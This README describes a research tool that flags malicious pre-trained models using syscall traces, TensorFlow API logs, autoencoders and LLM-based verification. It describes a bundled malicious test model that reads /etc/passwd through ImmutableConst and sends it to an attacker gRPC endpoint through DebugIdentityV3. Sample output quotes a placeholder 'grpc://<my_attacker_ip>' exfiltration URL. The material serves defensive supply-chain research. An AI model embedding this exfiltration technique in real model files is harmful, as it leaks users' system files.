# DDMO: Dynamic Detection of Malicious Model in the AI Supply Chain

An artifact for detecting malicious behaviors embedded in pre-trained model files through cross-layer reasoning over system-call traces and Python API semantics.

## Overview

The detection pipeline operates in three stages:

1. **Data Collection** — Captures two synchronized evidence streams: low-level syscall traces via `strace` and high-level Python API semantic logs via dynamic instrumentation.
2. **Coarse-grained Filtering** — Clusters raw syscalls into operation vectors, screens for anomalies via an unsupervised autoencoder.
3. **Fine-grained Verification** — A LLM pipeline first triages syscall-only anomalies and then performs cross-layer reasoning with API context to produce an intent score, threat category, and auditable evidence chain.

The four attack types monitored are: **File Leak**, **Malicious Code Write**, **IP Exposure**, and **Remote Shell Access**.

## Dataset

The full dataset consists of two parts:

**Part 1 — MalHug Dataset** (publicly available):
> [https://zenodo.org/records/13850049](https://zenodo.org/records/13850049)

A collection of real-world HuggingFace model artifacts, used as the foundation for both benign model training and attack embedding.

**Part 2 — Advanced TensorAbuse Synthetic Dataset** (constructed by us):
> [https://osf.io/qj26u/overview?view_only=143a10df404b4c289781caa4aafdc83a](https://osf.io/qj26u/overview?view_only=143a10df404b4c289781caa4aafdc83a)

## Directory Structure

```
DDMO/
├── loginit.py                     # Stage 2: SyscallParser, SyscallCluster，Autoencoder models
├── detect.py                      # Stage 2: Coarse-grained filtering (autoencoder anomaly detection)
├── fine_grained_detect.py         # Stage 3: Fine-grained LLM cross-layer verification
├── syscall_ae_model               # Pre-trained DirectAutoencoder weights
├── sequence_ae_model              # Pre-trained SequenceAutoencoder weights
├── vectorizer_and_thresholds.pkl  # Fitted DualSyscallVectorizer + training thresholds
├── result_anomalies.txt           # Output: anomalies from coarse-grained filtering
├── fine_grained_result.txt        # Output: final LLM cross-layer verdicts
└── test_model/
    ├── autoencoder/               # SavedModel under test (malicious TF autoencoder)
    ├── attack.py                  # Attack definition embedded in the model
    ├── model.py                   # Script that loads and runs the model
    ├── patch_utils.py             # Dynamic instrumentation for API call logging
    ├── syscall.log                # Collected strace output (63k lines)
    └── api_calls.log              # Collected Python API semantic log (23 records)
```

## Prerequisites

- Python 3.8+
- PyTorch
- NumPy
- `requests` library (for LLM API calls)

Install dependencies:

```bash
pip install torch numpy requests
```

## Quick Start (Using Provided Data)

All data files are pre-collected. You can run the detection pipeline directly:

### Step 1: Coarse-grained Filtering (Autoencoder Anomaly Detection)

Clusters syscalls, computes reconstruction loss via two autoencoders, and identifies anomalies using the 99.5th percentile threshold.

```bash
cd DDMO
python detect.py
```

**Output**: `result_anomalies.txt` — lists the top 0.5% anomalous operations with their reconstruction loss, PID, and full syscall sequence.

### Step 2: Fine-grained Verification (LLM Cross-Layer Reasoning)

A LLM pipeline:
- **Stage 1**: For each anomaly, the LLM examines syscall evidence only and determines if it could be part of an attack chain (File Leak, Code Write, IP Exposure, Shell Access). Anomalies with score >= 4 are escalated.
- **Stage 2**: Escalated anomalies are combined with the full `api_calls.log` context. The LLM independently selects relevant API entries and performs cross-layer reasoning to produce a final verdict (Benign/Malicious) with an intent score (0-10) and evidence chain.

Configure your LLM API key and endpoint:

```bash
export OPENAI_API_KEY="your-api-key"
export OPENAI_BASE_URL="your-api-endpoint/v1/chat/completions"
python fine_grained_detect.py
```

Without an API key, the script uses the default key and endpoint. If the LLM call fails, anomalies default to Benign with a failure note.

**Output**: `fine_grained_result.txt` — contains the global suspicious API summary, Stage 1 escalation statistics, and the final Malicious/Benign verdicts with detailed evidence chains.

## Running the Full Pipeline 

### Phase 0: Data Collection

> **Important**: Before re-collecting test data, edit `test_model/attack.py` and replace `grpc://<your remote server>` (line 14) with the URL of your own server capable of receiving gRPC connections. This server acts as the attacker's exfiltration endpoint to receive sensitive data (e.g., file contents) sent from the victim host during model execution.

#### 0a. Syscall collection (strace)

Capture kernel-level system call traces during model execution:

```bash
cd DDMO
strace -e trace=%clock,%creds,%desc,%file,%network,%signal --quiet=all --decode-fds=all -f -o test_model/syscall.log python test_model/model.py
```

#### 0b. API call collection (dynamic instrumentation)

Instrument TensorFlow before model execution. Edit `test_model/model.py` (or your own runner script) to inject instrumentation at startup:

```python
import tensorflow as tf
from patch_utils import inject_tensorflow_logging
export_dir = "./malicious_dataset/autoencoder"

loaded_model = tf.saved_model.load(export_dir)

log_file = open('ml_calls.log', 'w')
tf = inject_tensorflow_logging(log_stream=log_file, debug=False, loaded_model=loaded_model)

def main():
    print("[Autoencoder] loaded model from:", export_dir)
    test_input = tf.random.normal([1, 256])
    output = loaded_model(test_input)
    print(output.shape)

if __name__ == "__main__":
    main()
```

This wraps all public TensorFlow APIs and logs every call with arguments, operation type, and return type to `api_calls.log`.

### Phase 1: Model Training (optional, pre-trained weights provided)

The autoencoder models are already pre-trained on benign syscall traces. If you need to re-train from scratch (e.g., to adapt to a different OS or ML framework environment), follow these steps:

1. **Select trusted models**. Choose benign, publicly available models from platforms such as [HuggingFace](https://huggingface.co/models), [PyTorch Hub](https://pytorch.org/hub/), or [TensorFlow Hub](https://tfhub.dev/). Ensure the models are from verified publishers and have no known security issues.

2. **Collect benign syscall traces**. For each trusted model, collect kernel-level traces using the same `strace` command as in [Phase 0a](#0a-syscall-collection-strace):

   ```bash
   strace -e trace=%clock,%creds,%desc,%file,%network,%signal --quiet=all --decode-fds=all -f -o ../data/data0/filtered.log python your_benign_runner.py
   ```

   Place each trace file in `../data/data{i}/filtered.log` (where `i = 0, 1, ..., 9`). Run multiple models or multiple times to obtain diverse benign data covering both the model loading and inference phases.

3. **Train the autoencoders**:

   ```bash
   python -c "from loginit import train; train()"
   ```

   This reads all `../data/data*/filtered.log` files, clusters system calls, fits the vectorizer, and trains `DirectAutoencoder` and `SequenceAutoencoder`. Weights are saved to `syscall_ae_model`, `sequence_ae_model`, and `vectorizer_and_thresholds.pkl`.

### Phase 2: Detection Pipeline

```bash
python detect.py
python fine_grained_detect.py
```

## Test Model

The included test model is a malicious TensorFlow autoencoder that embeds a **File Leak** attack:

- `ImmutableConst` reads `/etc/passwd` into a TensorFlow constant
- `DebugIdentityV3` sends the content to an external gRPC address

## Output Format

### result_anomalies.txt

```
================================================================================
DDMO Anomaly Detection Results
================================================================================
Log file: ./test_model/syscall.log
Total events: 10416
Direct  threshold (99.5th): 0.00230167  (total 5682 events)
Sequence threshold (99.5th): 0.02028574  (total 4734 events)
================================================================================

------------------------------------------------------------
[1] ANOMALY | Type: Sequence (2 steps)
    Loss=0.02146034 | Threshold=0.02028574
    PID=3950929 | openat -> close
      Step 1: openat(AT_FDCWD, "/usr/lib/...") = 3
      Step 2: close(3) = 0
...
```

### fine_grained_result.txt

```
================================================================================
DDMO Fine-grained Verification Results (Two-Stage)
================================================================================
Total anomalies: 49
Final: Malicious=1, Benign=48, Unknown=0
--------------------------------------------------------------------------------

  [40] IntentScore=10.0 | Model Inference Phase
  socket -> close
  Evidence: (1) The syscall anomaly shows a DNS query to a non-standard external server at 1.2.3.4:53, performed via UDP socket, setsockopt, connect, sendmsg, and close. This is a typical hostname resolution step, often preceding an external network connection. (2) The application log contains the APIs __inference___call___177/ImmutableConst with memory_region_name="/etc/passwd", loading the contents of that sensitive file into a tensor, and __inference___call___177/DebugIdentityV3 with tensor_name="leak" and debug_urls=["grpc://<my_attacker_ip>:8080"]. This is an exact match for the File Leak attack pattern: reading a sensitive system file and sending it to an attacker-controlled external destination. (3) The two layers are consistent and complementary: the DNS query likely resolves the hostname embedded in the debug_urls before the actual gRPC exfiltration connection is established by the DebugIdentityV3 API. The presence of legitimate inference operations (MatMul, Relu, Sigmoid) alongside these malicious ops shows the model is weaponized to leak /etc/passwd under the guise of normal inference. (4) Final judgment: Malicious. The system call activity is not isolated; it is directly linked to a clear API-driven attack that reads /etc/passwd and exfiltrates it to an external gRPC endpoint. There is no legitimate framework purpose for ImmutableConst on /etc/passwd and DebugIdentityV3 to an arbitrary external URL during model inference.
    -> socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 20<UDP:[525807127]>
    -> setsockopt(20<UDP:[525807127]>, SOL_IP, IP_RECVERR, [1], 4) = 0
    -> connect(20<UDP:[525807127]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("1.2.3.4")}, 16) = 0
    -> sendmsg(20<UDP:[127.0.0.1:39624->1.2.3.4:53]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_bas) = 2
    -> close(20<UDP:[127.0.0.1:39624->1.2.3.4:53]>) = 0

================================================================================
Summary | Malicious=1 Benign=48 Unknown=0


```

